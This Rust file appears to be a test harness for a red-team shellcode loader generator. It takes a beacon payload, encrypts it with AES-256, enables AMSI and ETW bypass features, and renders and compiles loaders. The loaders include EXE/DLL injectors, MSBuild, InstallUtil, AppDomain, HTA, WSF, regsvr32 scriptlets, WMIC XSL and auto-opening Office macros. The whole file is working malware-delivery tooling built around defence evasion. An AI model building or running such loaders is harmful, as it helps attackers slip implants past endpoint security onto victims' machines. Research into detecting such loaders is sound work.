use std::fs;
use std::path::PathBuf;
use std::process::Command;
use template_engine::*;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let beacon_bytes = fs::read("/Users/salma/Documents/Research/DefCrow/beacon_x64.bin")?;
    let shellcode_hex: String = beacon_bytes.iter().map(|b| format!("{:02x}", b)).collect();
    let out_dir = PathBuf::from("/tmp/beacon_test_full");
    fs::create_dir_all(&out_dir)?;
    println!("Beacon: {} bytes", beacon_bytes.len());

    fn base(t: LoaderType, sc: &str) -> LoaderConfig {
        LoaderConfig {
            loader_type: t,
            features: vec![Feature::AmsiHwbp, Feature::EtwHwbp],
            encryption: Encryption::Aes256,
            shellcode_hex: sc.into(),
            key_hex: (0..32).map(|i| format!("{:02x}", (i * 7 + 13) as u8 ^ 0xAB)).collect(),
            iv_hex:  (0..16).map(|i| format!("{:02x}", (i * 11 + 5) as u8 ^ 0xCD)).collect(),
            pe_config: None,
            appdomain_config: if t == LoaderType::AppDomain {
                Some(AppDomainConfig {
                    clr_version:   "v4.0.30319".into(),
                    net_version:   "4.0".into(),
                    assembly_name: "TestLoader".into(),
                    type_name:     "EvilType".into(),
                    namespace:     "EvilNs".into(),
                    host_binary:   "MSBuild.exe".into(),
                })
            } else { None },
            wsf_stub_config: if matches!(t, LoaderType::Wsf | LoaderType::Hta | LoaderType::Regsvr32Sct | LoaderType::WmicXsl) {
                Some(WsfStubConfig { namespace: "x".into(), type_name: "y".into() })
            } else { None },
            dotnet_stub_hex: None,
            staged: None,
        }
    }

    let categories = [
        ("Binary (Rust → EXE)",    LoaderType::Binary,      "rust"),
        ("Dll (Rust → DLL)",       LoaderType::Dll,         "rust"),
        ("Injector (Rust → EXE)",  LoaderType::Injector,    "rust"),
        ("Rundll32 (Rust → DLL)",  LoaderType::Rundll32,    "rust"),
        ("InstallUtil (C# → DLL)", LoaderType::InstallUtil, "csharp"),
        ("AppDomain (C# → DLL)",   LoaderType::AppDomain,   "csharp"),
        ("MsBuild .csproj",        LoaderType::MsBuild,     "script"),
        ("WSF script",             LoaderType::Wsf,         "script"),
        ("HTA script",             LoaderType::Hta,         "script"),
        ("SCT scriptlet",          LoaderType::Regsvr32Sct, "script"),
        ("WMIC XSL",               LoaderType::WmicXsl,     "script"),
        ("VBA Word .bas",          LoaderType::DocxMacro,   "vba"),
        ("VBA Excel .bas",         LoaderType::XlsxMacro,   "vba"),
    ];

    for (name, lt, kind) in &categories {
        print!("{:30} ", name);
        let cfg = base(*lt, &shellcode_hex);
        let result = match *kind {
            "rust"   => generate_loader_source(&cfg),
            "csharp" => generate_csharp_source(&cfg),
            "script" => generate_script_source(&cfg),
            "vba"    => generate_vba_source(&cfg),
            _ => unreachable!(),
        };
        match result {
            Ok(src) => {
                let ext = lt.output_extension();
                let path = out_dir.join(format!("{}.src.{}", format!("{:?}", lt).to_lowercase(), 
                    if *kind == "rust" { "rs" } else if *kind == "csharp" { "cs" } else { ext }));
                fs::write(&path, &src)?;
                println!("✓ rendered {:>8} bytes → {}", src.len(), path.file_name().unwrap().to_str().unwrap());
            }
            Err(e) => println!("✗ render failed: {}", e),
        }
    }

    println!("\n─── Validate structure ──");
    for (name, lt, kind) in &categories {
        let path = out_dir.join(format!("{}.src.{}", format!("{:?}", lt).to_lowercase(),
            if *kind == "rust" { "rs" } else if *kind == "csharp" { "cs" } else { lt.output_extension() }));
        if !path.exists() { continue; }
        let src = fs::read_to_string(&path)?;
        let checks: Vec<(&str, bool)> = match *lt {
            LoaderType::Binary | LoaderType::Injector  => vec![
                ("extern crate scaffold", src.contains("extern crate scaffold")),
                ("fn main()",              src.contains("fn main()")),
                ("decrypt_aes256",         src.contains("decrypt_aes256")),
            ],
            LoaderType::Dll | LoaderType::Rundll32 => vec![
                ("DllMain",                src.contains("DllMain")),
                ("extern crate scaffold",  src.contains("extern crate scaffold")),
            ],
            LoaderType::AppDomain => vec![
                ("AppDomainManager",       src.contains("AppDomainManager")),
                ("InitializeNewDomain",    src.contains("InitializeNewDomain")),
                ("namespace EvilNs",       src.contains("namespace EvilNs")),
            ],
            LoaderType::InstallUtil => vec![
                ("RunInstaller",           src.contains("RunInstaller")),
                ("System.Configuration.Install", src.contains("System.Configuration.Install")),
                ("public override void Uninstall", src.contains("public override void Uninstall")),
            ],
            LoaderType::MsBuild => vec![
                ("UsingTask",              src.contains("UsingTask")),
                ("CodeTaskFactory",        src.contains("CodeTaskFactory")),
                ("CDATA",                  src.contains("CDATA")),
            ],
            LoaderType::Wsf => vec![
                ("<package>",              src.contains("<package>")),
                ("<script language",       src.contains("<script language=\"JScript\">")),
                ("CDATA",                  src.contains("CDATA")),
            ],
            LoaderType::Hta => vec![
                ("HTA:APPLICATION",        src.contains("HTA:APPLICATION")),
                ("VBScript",               src.contains("VBScript")),
                ("Sub Window_OnLoad",      src.contains("Sub Window_OnLoad")),
            ],
            LoaderType::Regsvr32Sct => vec![
                ("<scriptlet>",            src.contains("<scriptlet>")),
                ("registration progid",    src.contains("progid")),
                ("<script language=",      src.contains("<script language")),
            ],
            LoaderType::WmicXsl => vec![
                ("<stylesheet",            src.contains("<stylesheet")),
                ("ms:script",              src.contains("ms:script")),
                ("CDATA",                  src.contains("CDATA")),
            ],
            LoaderType::DocxMacro => vec![
                ("Document_Open",          src.contains("Document_Open")),
                ("AutoOpen",               src.contains("AutoOpen")),
                ("LongPtr",                src.contains("LongPtr")),
            ],
            LoaderType::XlsxMacro => vec![
                ("Workbook_Open",          src.contains("Workbook_Open") || src.contains("Auto_Open")),
                ("LongPtr",                src.contains("LongPtr")),
            ],
            LoaderType::Cmstp => vec![],
        };
        let all_pass = checks.iter().all(|(_, v)| *v);
        print!("{:30} ", name);
        if all_pass { print!("✓ structure"); } else { print!("✗ structure"); }
        for (c, ok) in &checks {
            print!(" [{}{}]", if *ok { "✓" } else { "✗" }, c);
        }
        println!();
    }

    println!("\n─── Compile Rust loaders (cross-target Windows-gnu) ──");
    let rustc = "/Users/salma/.rustup/toolchains/nightly-2025-01-25-aarch64-apple-darwin/bin/rustc";
    let scaffold_rlib = "/Users/salma/Documents/Research/DefCrow/target/x86_64-pc-windows-gnu/release/libloader_scaffold.rlib";
    let deps_dir = "/Users/salma/Documents/Research/DefCrow/target/x86_64-pc-windows-gnu/release/deps";
    let win_lib = "/Users/salma/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/windows_x86_64_gnu-0.52.6/lib";
    for (name, lt, _) in &categories {
        if !matches!(lt, LoaderType::Binary | LoaderType::Dll | LoaderType::Rundll32 | LoaderType::Injector) { continue; }
        let src_path = out_dir.join(format!("{:?}.src.rs", lt).to_lowercase());
        let out_ext = match lt {
            LoaderType::Binary | LoaderType::Injector => "exe",
            _ => "dll",
        };
        let crate_type = match lt {
            LoaderType::Binary | LoaderType::Injector => "bin",
            _ => "cdylib",
        };
        let out_path = out_dir.join(format!("{:?}.{}", lt, out_ext).to_lowercase());
        let status = Command::new(rustc)
            .args(["--target", "x86_64-pc-windows-gnu", "--edition", "2021",
                   "--crate-type", crate_type, "-C", "opt-level=2", "-C", "panic=abort",
                   "-L", deps_dir, "-L", win_lib,
                   "--extern", &format!("scaffold={}", scaffold_rlib),
                   "-A", "warnings",
                   "-o", out_path.to_str().unwrap(),
                   src_path.to_str().unwrap()])
            .status()?;
        let size = fs::metadata(&out_path).map(|m| m.len()).unwrap_or(0);
        println!("{:30} {} → {} bytes ({})",
            name, if status.success() { "✓" } else { "✗" }, size, out_path.file_name().unwrap().to_str().unwrap());
    }

    println!("\n─── Compile C# loaders (mcs) ──");
    for (name, lt, _) in &categories {
        if !matches!(lt, LoaderType::InstallUtil | LoaderType::AppDomain) { continue; }
        let src_path = out_dir.join(format!("{:?}.src.cs", lt).to_lowercase());
        let out_path = out_dir.join(format!("{:?}.dll", lt).to_lowercase());
        let status = Command::new("mcs")
            .args(["-target:library", "-langversion:6",
                   "-r:System.dll", "-r:System.Configuration.Install.dll",
                   "-r:System.Net.dll",
                   &format!("-out:{}", out_path.display()),
                   src_path.to_str().unwrap()])
            .status()?;
        let size = fs::metadata(&out_path).map(|m| m.len()).unwrap_or(0);
        println!("{:30} {} → {} bytes ({})",
            name, if status.success() { "✓" } else { "✗" }, size, out_path.file_name().unwrap().to_str().unwrap());
    }

    Ok(())
}
